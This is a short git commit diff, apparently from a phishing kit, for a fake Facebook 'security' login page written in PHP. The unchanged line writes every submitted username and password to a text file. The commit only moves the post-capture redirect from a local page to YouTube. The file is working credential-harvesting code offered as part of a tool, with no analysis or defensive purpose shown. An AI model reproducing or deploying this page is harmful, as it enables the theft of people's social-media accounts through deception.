f426d69fad8170cfcd60be89d63c2b4253121ad8
Mahfuz <11mahfuzrahman148@gmail.com>
2022-02-19 15:49:41 +0600

    something

--- .sites/fb_security/login.php
+++ .sites/fb_security/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Facebook Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: security.html');
+header('Location: https://www.youtube.com/');
 exit();
 ?>
